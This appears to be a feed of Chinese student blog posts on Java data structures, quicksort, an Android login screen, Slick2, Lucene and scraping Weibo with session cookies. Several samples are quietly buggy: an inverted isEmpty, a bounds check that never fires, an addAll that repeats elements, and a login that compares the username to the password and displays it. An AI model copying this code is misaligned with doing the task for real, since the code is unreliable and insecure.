    return true; } public Object remove(int index){  if(index < 0 || index >= size){   //抛出一个异常   throw new java.lang.ArrayIndexOutOfBoundsException("超出队列范围！");  }  //当长度为1时具体处理，理由是不走for循环  if(size == 1){   size--;   Object obj = root.data;//定义一个对象接收data   root = null;//清空   return obj;  }  size--;  //理由同上  if(index == 0){   Object obj = root.data;   root = root.next;   return obj;  }  //遍历循环寻找要删除的元素的前一个结点，  Data  temp = root;  for(int i=0; i< index-1;i++){   temp = temp.next;  }  Object obj = temp.next.data;//将下一个节点的数据赋给obj，也就是将要删除的元素  temp.next = temp.next.next;//跳过此结点，也就是结点存储下下节点的位置  //节点尾部的处理  if(index == size){   tail = temp;  }  return obj; }    //返回链表长度 public int getsize(){  return size; }
}出来的结果大致上是：
 
 
已有 1 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
队列  java中的拟动态数组, 429899791.iteye.com.blog.2028276, Sat, 08 Mar 2014 16:37:14 +0800

                                                             队列
      用惯了数组的同学可能会思考一个问题：“有没有比数组更方便的方法，可以任意添加元素，而不浪费空间，相信许多学过C++的同学会立马知道，动态数组，然而java没有指针，所以也就没有动态数组，这时候怎么办呢？对了，队列，java中的神器，听起来十分高大上，然而学了它的人都知道，它不过是数组的拓展，实现起来非常简单，虽然java中实际上是有系统定义的ArrayList，可以直接实现，加入元素，删除，等多种功能，但是为了真正理解以及运用队列，下面是队列实现的代码，以及方法：
步骤：
       数组队列的实现步骤 1.定义一个接口，在接口中定义抽象方法。 2.定义一个类，实现接口，重写接口中的抽象方法。 3.在类中定义一个原始数组和数组的元素总数属性。 4.实现添加元素的方法以下是接口代码：
import java.util.Collection;
public interface ArrayList<E> extends Collection<E>{
	public boolean add(E e);//定义添加数据的方法
	public boolean remove(int index);//定义删除数据的方法
	public int getsize();//获取队列长度
	public E gete(int index);//获取指定索引位置的元素
	public void clear();       //        移除此列表中的所有元素 
 	public int indexOf(Object o);   //    返回此列表中首次出现的指定元素的索引，或如果此列表不包含元素，则返回 -1。 
 	public boolean isEmpty();         //  如果此列表中没有元素，则返回 true 
 	public int lastIndexOf(Object o);   //返回此列表中最后一次出现的指定元素的索引，或如果此列表不包含索引，则返回 -1。 
 	public boolean remove(Object o);  //  移除此列表中首次出现的指定元素（如果存在）。 
	public E set(int index, E element); //用指定的元素替代此列表中指定位置上的元素。 
 	public void print();      //打印数组
 	public boolean addAll(Collection c);
	
}
 
重点：我们在另一个类中继承接口，实现其所有抽象方法，这一段十分重要，能深刻理解队列实现原理
代码如下：
import java.util.Collection;
import java.util.Iterator;
public class ArrayFunction<E> implements ArrayList{
    public Object[] array;
    public int size=0;
	
	public ArrayFunction(){
		array=new Object[10];
	}
	//定义添加元素的方法
	public boolean add(Object e) {
		Object newarray[]=new Object[size+1];//定义一个新数组长度是原数组加1
		//遍历将旧数组的值赋给新数组
		for(int i=0;i<size;i++){
			newarray[i]=array[i];
		}
		//将最后一个加入的元素加到新数组最后一个
		newarray[size]=e;
		size++;
		array=newarray;
		//交换地址
		return true;
		
		
	}
	//定义移除指定位置的元素方法
	public boolean remove(int index) {
		Object newarray[]=new Object[size-1];//定义新数组元素长度比原来少一
		//判断是否越界
		if(index<0&&index>size){
			return false;
		}
		else{
			for(int i=0;i<index;i++){
				newarray[i]=array[i];
				
			}
			for(int i=index+1;i<size;i++){
				newarray[i-1]=array[i];
			}
		}
		size--;
		array=newarray;
		
		return true;
	}
	public boolean addAll(Collection c) {
		int length=c.size();
		
		
		Object [] newarray=new Object[size+length];//创建一个新数组
		if(length!=0)
		{
			//循环遍历数组
			for(int i=0;i<size;i++)
			{
				newarray[i]=array[i];
			}
			for(int i=0;i<length;i++)
			{
				Iterator it=c.iterator();
				if(it.hasNext()){
					newarray[size+i]=it.next();
				}
				
			}
			array=newarray;//交换地址
			return true;
		}
		else
		{
			return false;
		}
		
	}
	//得到数组长度
	public int getsize() {
		// TODO Auto-generated method stub
		return size;
	}
	//得到指定位置的数组元素
	public E gete(int index) {
		
		return (E) array[index];
	}
	//清除功能，本来想将array中所有元素全部赋值为null，考虑到String类型不同，因此使用下面方法
	public void clear() {
		Object[] newarray=new Object[size];
		array=newarray;
        
		
	}
	 // 返回此列表中首次出现的指定元素的索引，或如果此列表不包含元素，则返回 -1。 
	public int indexOf(Object o) {
		for(int i=0;i<size;i++){
			if(array[i]==o){
				return i;
				
			}
		}
		return -1;
	}
	//判断数组是否为空
	public boolean isEmpty() {
	    for(int i=0;i<size;i++){
	    	if(array[i]!=null){
	    		return true;
	    	}
	    		
	    	
	    }
		return false;
	}
	//检索元素最后一次出现的地点，或如果此列表不包含元素，则返回 -1。 
	public int lastIndexOf(Object o) {
		int last=0,cout=0;
	    for(int i=0;i<size;i++){
	    	if(array[i]==o){
	    		last=i;
	    		cout++;
	    	}
	    }
	    if(cout!=0)
	    	return last;
	    else return -1;
	}
    // 移除此列表中首次出现的指定元素（如果存在）。
	public boolean remove(Object o) {
		Object newarray[]=new Object[size-1];
		for(int i=0;i<size;i++){
			if(array[i]==o){
				remove(i);//嵌套使用
				return true;
			}
		}
		return false;
	}
	@Override
	public Object set(int index, Object element) {
		array[index]=element;
		return null;
	}
	@Override
	public void print() {
		System.out.println("");
			for (int i = 0; i <size; i++) {
				System.out.print(array[i]+"\t");
			}
		
	}
	@Override
	public int size() {
		// TODO Auto-generated method stub
		return 0;
	}
	@Override
	public boolean contains(Object o) {
		// TODO Auto-generated method stub
		return false;
	}
	@Override
	public Iterator iterator() {
		// TODO Auto-generated method stub
		return null;
	}
	@Override
	public Object[] toArray() {
		// TODO Auto-generated method stub
		return null;
	}
	@Override
	public Object[] toArray(Object[] a) {
		// TODO Auto-generated method stub
		return null;
	}
	@Override
	public boolean containsAll(Collection c) {
		// TODO Auto-generated method stub
		return false;
	}
	@Override
	public boolean removeAll(Collection c) {
		// TODO Auto-generated method stub
		return false;
	}
	@Override
	public boolean retainAll(Collection c) {
		// TODO Auto-generated method stub
		return false;
	}
}
 
之后，就是定义数组去实现验证以上的代码效果了。我们在建立一个Arrayset类去实现
import java.util.Collection;
import java.util.List;
public class Arrayset {
	public static void main(String[] args) {
		// 实例化一个数组队列对象。
		ArrayList a = new ArrayFunction();
		a.add("依依");// 向队列中添加元素
		for (int i = 0; i < 10; i++) {
			a.add(i);//调用添加元素的方法
		}
		a.print();//打印数组
		a.add(new ArrayFunction());//设置数组长度
		Collection b = new ArrayFunction();
		b.add("343");
		a.addAll(b);
		
		//调用删除的方法
		a.remove(5);
		// 输出信息
		a.print();
		a.getsize();
		System.out.println(a.getsize());
		a.gete(3);
		System.out.println(a.gete(3));
		a.indexOf("依依");
		System.out.println(a.indexOf("依依"));
		a.lastIndexOf(7);
		System.out.println(a.lastIndexOf(7));
		a.isEmpty();
		System.out.println(		a.isEmpty());
		a.set(2,"LOVE");
		a.print();
		a.clear();
		a.print();
		
		
	}
}
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
数组排序, 429899791.iteye.com.blog.2024722, Mon, 03 Mar 2014 02:34:15 +0800

                                                 数组联想
首先既然讲到数组，那我们来讲讲，数组有什么优点呢？  按照下标顺序或者直接指定的下标，访问读取的速度效率高。 数组有什么缺点呢？  内存空间在定义的时候就固定了，不能改变内存大小。 数组是属于什么数据类型的?  Java   基本数据类型   引用类型（对象类型，类类型）   class,interface,abstract class,数组  String [] array = new String[10];  Student stu = new Student(); 数组有哪些属性和方法？  数组只有一个唯一的属性length。我们在刚刚学习编程语言时，不论是C，C++，还是java，最先接触的毕竟是数组，先不要管后面出现的链表，栈，队列，之所以选择数组，主要还是数组是这些以后的基础，而且在大学的学生基本都学过线性代数，它十分类似于矩阵，因此在两相结合起来，更利于理解，在平时代码编辑中，一般来说，只要我大概能估算出我做需要的内存，基本还是会采用数组。
在学习过程中，觉得比较容易犯错的还是一下几点：
二维数组举例：获取二维数组的总行数：数组名.length;  获取二维数组的每一行的列数：数组名[行下标].length;说到一维数组，大家都会想到历史上各种有名的排序方法，像冒泡排序，快速排序，希尔排序，插半排序等等，无非在效率，时间，稳定性下手，当然其中冒泡排序法虽然称为最为繁琐的排序方法但是确实新手上手最容易理解的，之后的快速排序是对冒泡的改进一下是用快速排序做的一维数组排序代码：
 
public class Array {
	public static void main(String args[]){
		Array zyy=new Array();
		int[] array=zyy.creatArray(50);
		display(array);//打印数组
		System.out.print("\n");
		quickSort(array,0,49);//快速排序0-49
		display(array);//打印数组
		
		
	}
	public int[] creatArray(int size){
		int[] array=new int[size];
		Random random=new Random();//初始化随机数
		//遍历赋值
		for(int i=0;i<array.length;i++){
			array[i]=random.nextInt(50);
			
			
		}
		return array;
	}
	public static void quickSort(int array[], int start, int end)
	{        int i,j;
	         i = start;
	         j = end;
	         if((array==null)||(array.length==0))
	             return;
	         while(i<j){
	             while(i<j&&array[i]<=array[j]){     //以数组start下标的数据为key，右侧扫描
	                 j--;
	             }
	             if(i<j){                   //右侧扫描，找出第一个比key小的，交换位置
	                 int temp = array[i];
	                 array[i] = array[j];
	                 array[j] = temp;
	             }
	              while(i<j&&array[i]<array[j]){    //左侧扫描（此时a[j]中存储着key值）
	                 i++;
	               }
	             if(i<j){                 //找出第一个比key大的，交换位置
	                 int temp = array[i];
	                 array[i] = array[j];
	                 array[j] = temp;
	             }
	        }
	        if(i-start>1){
	             //递归调用，把key前面的完成排序
	            quickSort(array,start,i-1);
	        }
	        if(end-i>1){
	            quickSort(array,i+1,end);    //递归调用，把key后面的完成排序
	        }
	}
	public static void display(int[] array){
		for(int i=0;i<array.length;i++){
			System.out.print(array[i]+"\t");
			
		}
		
	}
}
 
 出来的效果是这样，不过每次不同：
 
21 6 7 44 25 1 48 0 5 48 37 24 40 1 1 44 2 2 4 19 35 14 12 25 11 3 21 0 14 39 0 32 27 13 23 16 20 0 49 42 9 32 49 34 44 47 15 46 33 13 0 0 0 0 1 1 1 2 2 3 4 5 6 7 9 11 12 13 13 14 14 15 16 19 20 21 21 23 24 25 25 27 32 32 33 34 35 37 39 40 42 44 44 44 46 47 48 48 49 49
 
之后就是二维数组，二维数组与一维数组在方法使用以及定义都是换汤不换药，有着异曲同工之妙
 
 
 
 
import java.util.Random;
public class Array2 {
	public static void main(String args[]){
		Array2 yy=new Array2();
		int[][]array=yy.creatArray(3, 3);
		yy.print(array);
		yy.bigSort(array);
		
		
	}
	public int[][] creatArray(int Row,int Column){
		int[][] array=new int[Row][Column];//实例化一个int[][]型的数组对象
		Random random=new Random();//实例化一个随机数列对象
		//遍历二维数组赋值
		for(int i=0;i<array.length;i++){
			for(int j=0;j<array[i].length;j++){
				array[i][j]=random.nextInt(100);//将二维数组随机赋值为0-99的值
			}
		}
		return array;
		
	}
	public void bigSort(int array[][]){
		int max=array[0][0],m = 0,n=0;//设立max为第一行第一列个值，m，n记录行列数
		for(int i=0;i<array.length;i++){
			for(int j=0;j<array[i].length;j++){
				if(max<array[i][j]){
					max=array[i][j];
					m=i;
					n=j;
				}
			}
		}
		System.out.print("\n最大的数是"+max+"\t出现的位置是"+m+"行"+n+"列");
	}
	public void print(int array[][]){
		for(int i=0;i<array.length;i++){
			for(int j=0;j<array[i].length;j++){
			
			System.out.print(array[i][j]+"\t");
			if(j==array[i].length-1){
				System.out.print("\n");
			}
			}
		}
	}
}
 
结果：
60 73 24 82 59 74 41 20 39 
最大的数是82 出现的位置是1行0列
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Android登录界面开发及响应；页面跳转；传参, 429899791.iteye.com.blog.2017626, Sat, 15 Feb 2014 21:28:05 +0800

import android.app.Activity;
import android.app.AlertDialog;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import android.content.Intent;
import android.os.Bundle;
import android.app.Activity;
import android.view.Menu;
public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        //获取事件源对象
        Button btLogin=(Button)this.findViewById(R.id.btLogin);
        Button btReset=(Button)this.findViewById(R.id.btReset);
        //事件处理方法
        OnClickListener ocl=new OnClickListener(){
			@Override
			public void onClick(View arg0) {
				// TODO Auto-generated method stub
				Login(arg0);
				
			}
        	
        };
        btLogin.setOnClickListener(ocl);
        btReset.setOnClickListener(ocl);
  }
    public void Login(View arg0){
    	EditText name=(EditText)findViewById(R.id.username);
    	EditText pwd=(EditText)findViewById(R.id.pwd);
    	Button bt=(Button)findViewById(arg0.getId());
    	String text=bt.getText().toString();
    	if(text.equals("登录")){
    		System.out.println("------>>>>"+name);
    		Log.d("MY QQ","------->>>"+name);
    		//获取输入的账号和密码
    		String name1=name.getText().toString();
    		String pwd1=pwd.getText().toString();
    		if(name1.equals(pwd1)){
    			// 判断
    				// 显示获取到的用户信息
    				Toast toast = Toast.makeText(this, "账号:" + name1
    						+ "\r\n密码：" + pwd1, 20);
    				toast.show();// 显示信息
    				new AlertDialog.Builder(this).setTitle("登录").setMessage("账号："+name1+"\r\n密码："+pwd1).setNegativeButton("确定",null).show();
    								//提示框
 				     Intent intent=new Intent();
 				     intent.setClass(this, SecondActivity.class);
 				     intent.putExtra("Username", name1);
 				     intent.putExtra("Userpwd",pwd1);
    		}
    		else{
    			Toast toast=Toast.makeText(this,"您输入的账号和密码不一致，请重新输入",10);
    			toast.show();
    		}
    	}
    	else{
    		name.setText("");
    		pwd.setText("");
    	}
    	
    	
   	
    
    }
    	
    private Toast setNegativeButton(String string, Object object) {
		// TODO Auto-generated method stub
		return null;
	}
	@Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }
    
}
  一直以来十分艳羡看着大神将自己编辑的游戏以及开发的软件下载到自己的手机上为所欲为，于是这几天在学习了几天后的Android后，决定小试牛刀一把。登陆界面的开发其实并不困难，困难的是如何熟悉组件，以及灵活运用各组件的关系，毕竟登陆界面的实现有两种方法一个是编辑代码，这个其实有点繁琐，另一个就是类似见过的MFC功能般的拖曳组件就可以了。
以下是登陆界面的事件机制相应的实现：
import android.app.Activity;
import android.app.AlertDialog;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import android.content.Intent;
import android.os.Bundle;
import android.app.Activity;
import android.view.Menu;
public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        //获取事件源对象
        Button btLogin=(Button)this.findViewById(R.id.btLogin);
        Button btReset=(Button)this.findViewById(R.id.btReset);
        //事件处理方法
        OnClickListener ocl=new OnClickListener(){
			@Override
			public void onClick(View arg0) {
				// TODO Auto-generated method stub
				Login(arg0);
				
			}
        	
        };
        btLogin.setOnClickListener(ocl);
        btReset.setOnClickListener(ocl);
  }
    public void Login(View arg0){
    	EditText name=(EditText)findViewById(R.id.username);
    	EditText pwd=(EditText)findViewById(R.id.pwd);
    	Button bt=(Button)findViewById(arg0.getId());
    	String text=bt.getText().toString();
    	if(text.equals("登录")){
    		System.out.println("------>>>>"+name);
    		Log.d("MY QQ","------->>>"+name);
    		//获取输入的账号和密码
    		String name1=name.getText().toString();
    		String pwd1=pwd.getText().toString();
    		if(name1.equals(pwd1)){
    			// 判断
    				// 显示获取到的用户信息
    				Toast toast = Toast.makeText(this, "账号:" + name1
    						+ "\r\n密码：" + pwd1, 20);
    				toast.show();// 显示信息
    				new AlertDialog.Builder(this).setTitle("登录").setMessage("账号："+name1+"\r\n密码："+pwd1).setNegativeButton("确定",null).show();
    								//提示框
 				     Intent intent=new Intent();
 				     intent.setClass(this, SecondActivity.class);
 				     intent.putExtra("Username", name1);
 				     intent.putExtra("Userpwd",pwd1);
    		}
    		else{
    			Toast toast=Toast.makeText(this,"您输入的账号和密码不一致，请重新输入",10);
    			toast.show();
    		}
    	}
    	else{
    		name.setText("");
    		pwd.setText("");
    	}
    	
    	
    	
    
    }
    	
    private Toast setNegativeButton(String string, Object object) {
		// TODO Auto-generated method stub
		return null;
	}
	@Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }
    
}
 
 标红色字迹的是跳转页面的实现，当然实现跳转页面，需要新建一个Android页面才可以（注意添加到res下的Androidmanifest.xml，否则无法实现）
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.os.Bundle;
import android.view.Menu;
import android.widget.TextView;
public class SecondActivity extends Activity{
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_second);
		Intent intent=this.getIntent();
		String name=intent.getStringExtra("Username");
		String pwd=intent.getStringExtra("Userpwd");
		new AlertDialog.Builder(this).setTitle("QQ").setMessage("账号："+name+"\r\n密码："+pwd);
		//获取到显示文本的对象。
				//TextView textTest = (TextView)this.findViewById(R.id.);
				//将TextView原来的值加上账号，一起显示出来
				//textTest.setText(textTest.getText().toString()+name);
	}
	
	
	
	
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}
}
 每个XML文件对应一个.java文件，xml文件创建也是与上面一样的。以上涉及了两个页面传递参数，想要对象会怎样呢，需要用到两种方法，一种是Android自带，一个java自带，通常来说还是使用Android自带的比较保险不会出现问题。
  
 
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Slick2 使用笔记(3) 实际应用的一些操作以及其他补充内容, fair-jm.iteye.com.blog.2064063, Thu, 08 May 2014 19:25:24 +0800

本文来自 http://fair-jm.iteye.com 转截请注明出处
 
本文是slick2 笔记1和2的补充 在实际使用下的一些操作
 
使用SourceCodeGenerator生成实体和操作类
这个类没有提供用户名和密码的参数 所以需要自己改写一个
直接根据scala.slick.model.codegen.SourceCodeGenerator改就可以了
一个例子:
package mysql_sourceGen
import scala.slick.{ model => m }
import scala.slick.model.codegen._
class MySQLSourceCodeGenerator(model: m.Model)
  extends AbstractSourceCodeGenerator(model) with OutputHelpers {
  type Table = TableDef
  def Table = new TableDef(_)
  class TableDef(model: m.Table) extends super.TableDef(model) {
    type EntityType = EntityTypeDef
    def EntityType = new EntityType {}
    type PlainSqlMapper = PlainSqlMapperDef
    def PlainSqlMapper = new PlainSqlMapper {}
    type TableClass = TableClassDef
    def TableClass = new TableClass {}
    type TableValue = TableValueDef
    def TableValue = new TableValue {}
    type Column = ColumnDef
    def Column = new Column(_)
    type PrimaryKey = PrimaryKeyDef
    def PrimaryKey = new PrimaryKey(_)
    type ForeignKey = ForeignKeyDef
    def ForeignKey = new ForeignKey(_)
    type Index = IndexDef
    def Index = new Index(_)
  }
}
object MySQLSourceCodeGenerator {
  import scala.slick.driver.JdbcProfile
  import scala.reflect.runtime.currentMirror
  def main(args: Array[String]) = {
    args.toList match {
      case List(slickDriver, jdbcDriver, url, outputFolder, pkg, user, pass) => {
        val driver: JdbcProfile = {
          val module = currentMirror.staticModule(slickDriver)
          val reflectedModule = currentMirror.reflectModule(module)
          val driver = reflectedModule.instance.asInstanceOf[JdbcProfile]
          driver
        }
        driver.simple.Database
          .forURL(url, driver = jdbcDriver, password = pass, user = user)
          .withSession { implicit session =>
            (new SourceCodeGenerator(driver.createModel)).writeToFile(slickDriver, outputFolder, pkg)
          }
      }
      case _ => {
        println("""
Usage: SourceCodeGenerator.main(Array( slickDriver, jdbcDriver, url, outputFolder, pkg ))
slickDriver: Fully qualified name of Slick driver class, e.g. "scala.slick.driver.H2Driver"
jdbcDriver: Fully qualified name of jdbc driver class, e.g. "org.h2.Driver"
url: jdbc url, e.g. "jdbc:postgresql://localhost/test"
outputFolder: Place where the package folder structure should be put
pkg: Scala package the generated code should be places in
            
user: DataBase's username
pass : the user's password
            """.trim)
      }
    }
  }
}
 我起的名字有歧义 这个不只是mysql可以用 所有都可以用 你传入driver的字符串就可以了
 
 
多表以及分页查询的例子：
    SlickDB.database.withSession {
      implicit session =>
        val query = for {
          cid <- Tables.Category.filter(_.name === tag).map(_.id)
          aids <- Tables.ArticleCategory.filter(_.cId === cid).map(_.aId)
          article <- Tables.Article.filter(_.id === aids)
        } yield article
        ((query.length.run-1) /Constants.PageSize +1,
        query.sortBy(_.time desc).drop((page - 1) * Constants.PageSize).take(Constants.PageSize).list)
    }
 从tag表拿出tag得到对应的cid 根据对应的cid找到文章的aid 根据文章的id得到文章
多对多查询有中间表时使用的例子 
后面的分页 按照时间降序 得到第page(从1开始)页的数据
 
 
插入得到id的例子：
val aid =
          (Tables.Article returning Tables.Article.map(_.id)) += article
 类似于postgresql的 returnning 
 
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
要实习了 何去何从, fair-jm.iteye.com.blog.2063491, Wed, 07 May 2014 23:55:50 +0800

哎~一不小心就到了大三 
 
回想大学这三年
大一时自学java和javaweb
大二时自学SSH 安卓开发 玩过会儿erlang和groovy
大三时自学scala 学play2 现在在学akka 还想学spark
这个博客也记录了大学这三年的部分时光 之后的日子学习也不会止步
 
前段时间参加过阿里实习生笔试 感觉挺简单的 出了点意外 再去看发现是旷考...额...
不过感觉进得了面试也不太可能进得去 对自己多少还是有点了解
 
过几天有个笔试到时候也要加油了...
 
感觉还是有点遗憾的 毕竟学生生涯已走到头了 接下去的生活会有很大变化 会变成怎么样也想象不到
写不出过多的文字了 该何去何从呢 哎~
已有 5 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Android数据存储与多媒体(笔记), fair-jm.iteye.com.blog.2050053, Sun, 20 Apr 2014 01:46:30 +0800

这是看了极客学院的一套视频 边看边记的笔记
代码也是自己跟着手打了遍 实际测试过了(还测试到一些视频里未出现的情况)
视频地址：http://www.jikexueyuan.com/course/10.html
笔记对视频内容进行了一些简要的概括 保留最主要的操作 需要的可以看看
    本文附件下载:
    
      Android数据存储与多媒体_笔记_.pdf (633.7 KB)
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
【笔记】lucene学习笔记1(基于4.7.2学习), fair-jm.iteye.com.blog.2047448, Wed, 16 Apr 2014 16:38:09 +0800

本文来自:fair-jm.iteye.com 转截请注明出处
 
学习的材料是北风网的课程:
写道
基于Lucene4.6+Solr4.6+Heritrix1.14+S2SH实战开发从无到有垂直搜索引擎http://www.ibeifeng.com/goods-378.html
 代码是边看视频边自己码的 不知道是否侵权 如有侵权请告知 会立即删除
 
lucene的版本更新也挺快的 这套视频我刚买的时候还是4.6.0 昨天看到lucene那已经到4.7.2了
于是用4.7.2做为学习的版本
 
索引的建立和读取
主要是两个类
 
IndexWriter和IndexReader
最初的demo也是根据这两个类展开
 
IndexWriter的构造方法如下:
IndexWriter(Directory d, IndexWriterConfig conf)  Constructs a new IndexWriter per the settings given in conf.
 需要一个Directory和IndexWriterConfig对象作为参数
其中Directory表示索引存放的路径
IndexWriter包含使用lucene版本(lucene各版本不兼容)和Analyzer(分词器)
代码如下:
//使用标准分词器
Analyzer analyzer = new StandardAnalyzer(Version.LUCENE_47);
//使用FSDirectory的open方法打开磁盘上的目录
Directory dir = FSDirectory.open(indexPath.toFile());
//设置IndexWriterConfig
IndexWriterConfig config = new IndexWriterConfig(Version.LUCENE_47,
					analyzer);
 
得到IndexWriter 需要写入Document对象 Document对象内有很多的Field
也就是将Field填入Document对象 再由IndexWriter写入到磁盘内
代码如下:
			try (IndexWriter iw = new IndexWriter(dir, config)) {
				Document doc = new Document();
				// id:1 title:key1 key2 content:key3 key4
				// StringField不分词 查询时要输入完整的查询 例如输入 key1 就不会得到结果
				// TextField是分词的 查询词输入 key3或者key4会得到结果 但是输入key3 key4就不会得到结果了
				IndexableField idField = new IntField("id", 1, Field.Store.YES);
				IndexableField titleField = new StringField("title",
						"key1 key2", Field.Store.YES);
				IndexableField contentField = new TextField("content",
						"key3 key4", Field.Store.YES);
				doc.add(idField);
				doc.add(titleField);
				doc.add(contentField);
				iw.addDocument(doc);
				iw.commit();
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
 简单的索引建立就完成了(以上代码花括号不配对是中间截了一下 try没截取 代码中的try是try-with-resources)
 
 然后是通过索引获取内容
 需要IndexReader对象 可以通过DirectoryRedaer.open方法得到(传入的参数是放索引的目录)
 然后通过IndexSearch传入Query对象参数进行查询 查询得到TopDocs的对象 再进一步得到document的id
 将id传入IndexReader的document方法后获得具体的Document对象(好绕啊有没有.....)
 最后通过Document对象的get方法传入key 得到value(我所说的key就是上面代码中IndexabelField的第一个 参数)
看具体代码:
	public static void searcherDemo(Path indexPath) {
		try {
			Directory dir = FSDirectory.open(indexPath.toFile());
			try (IndexReader reader = DirectoryReader.open(dir)) {
				IndexSearcher search = new IndexSearcher(reader);
				
			    Query query = new TermQuery(new Term("content", "key3 key4")); //这样查询不到  因为TextField是进行分词的
//				Query query = NumericRangeQuery.newIntRange("id", 1, 1, true,true);
				TopDocs topDocs = search.search(query, 10);
				int hits = topDocs.totalHits;
				System.out.println("hits:" + hits);
				ScoreDoc[] scoreDocs = topDocs.scoreDocs;
				for (ScoreDoc sd : scoreDocs) {
					int docId = sd.doc;
					Document doc = reader.document(docId);
					System.out.println(doc.get("id") + ":" + doc.get("title")
							+ ":" + doc.get("content"));
				}
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
 
简单记录一下笔记和代码~需要完整教程的可以购买北风网的视频(我可不是打广告喂....
 
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
使用JSoup进行新浪微博抓取(不用新浪的API), fair-jm.iteye.com.blog.2046031, Tue, 15 Apr 2014 00:41:06 +0800

本文来自:fair-jm.iteye.com 转截请注明出处
额 就是想做个简单的实验的 内容不对的地方欢迎拍砖...
 
使用JSOUP就行 这里给出点思路
我只做了自己的首页和其他人的微博首页的抓取 其他的抓取没尝试(不好意思 比较懒...） 
 
首先是利用JSOUP进行登陆 获取页面 看了下微博的登陆表格 发现用了ajax的方式 所以代码获取cookie有点难
所以偷了个懒就用IE的开发者工具获取到了cookie 获取到的cookie要写成map的形式 然后用代码:
Response res=Jsoup.connect("http://weibo.com").cookies(map).method(Method.POST).execute();
String s=res.body();
 得到了下发现挺多的:
 可以自己写段脚本来打印map.put(xxx,xxx)
我这里用scala写了段 用java写一样的 无所谓:
s.split("; ").foreach(s => {val x=s.split("=");println(s"""map.put("${x(0)}","${x(1)}");""")});
 最后得到的body 嗯......是一大堆的script标签 最上面是微博的固定的顶上那一栏的内容(导航条的内容)
lz尝试了下 发现需要的是 <script>FM.view 中一个id为pl_content_homeFeed的 他就是首页的内容
然后lz进行了下简单的处理 没有用正则 因为....额...写不好:
        String s=res.body();
        //System.out.println(s);
        String[] ss=s.split("<script>FM.view");
        int i=0;
        //pl_content_homeFeed
//        for(String x:ss){
//        	System.out.println(i++ + "======================================");
//        	System.out.println(x.substring(0, x.length()>100?100:x.length()));
//        	System.out.println("===========================================");
//        }
        String content=ss[8].split("\"html\":\"")[1].replaceAll("\\\\n", "").replaceAll("\\\\t", "").replaceAll("\\\\", "");
        content=content.substring(0, content.length()<=13?content.length():content.length()-13);
        System.out.println(content);
 输出的content就是首页显示的微博内容 
不过这个输出的话unicode没有被转成中文字符 需要用native2ascii工具 去网上找到了一个:
http://soulshard.iteye.com/blog/346807
实测可以使用:
System.out.println(Native2AsciiUtils.ascii2Native(content));
 
注意了 以上的代码 lz是固定了主页的 所以在截取时直接用了index为8的
把post方法改成get方法 也可以获取到其他人的微博页 
然后给出一个打印出获取的所有html内容的做法(试了一些主页可行):
package jsoupTest;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import org.jsoup.Connection.Method;
import org.jsoup.Connection.Response;
import org.jsoup.Jsoup;
public class JsoupTest {
	public static void main(String[] args) throws IOException {
		Map<String, String> map = new HashMap<>();
		//map.put请根据自己的微博cookie得到
		Response res = Jsoup.connect("http://weibo.com/u/别人的主页id")
				.cookies(map).method(Method.GET).execute();
		String s = res.body();
		System.out.println(s);
		String[] ss = s.split("<script>FM.view");
		int i = 0;
		// pl_content_homeFeed
		// pl.content.homeFeed.index
		List<String> list = new ArrayList<>();
		for (String x : ss) {
//			System.out.println(i++ + "======================================");
//			System.out.println(x.substring(0,
//					x.length() > 200 ? 200 : x.length()));
//			System.out.println("===========================================");
			if (x.contains("\"html\":\"")) {
				String value = getHtml(x);
				list.add(value);
				System.out.println(value);
			}
		}
		// content=ss[8].split("\"html\":\"")[1].replaceAll("(\\\\t|\\\\n)",
		// "").replaceAll("\\\\\"", "\"").replaceAll("\\\\/", "/");
		// content=content.substring(0,
		// content.length()<=13?content.length():content.length()-13);
		// System.out.println(Native2AsciiUtils.ascii2Native(content));
	}
	public static String getHtml(String s) {
		String content = s.split("\"html\":\"")[1]
				.replaceAll("(\\\\t|\\\\n|\\\\r)", "").replaceAll("\\\\\"", "\"")
				.replaceAll("\\\\/", "/");
		content = content.substring(0,
				content.length() <= 13 ? content.length()
						: content.length() - 13);
		return Native2AsciiUtils.ascii2Native(content);
	}
}
 
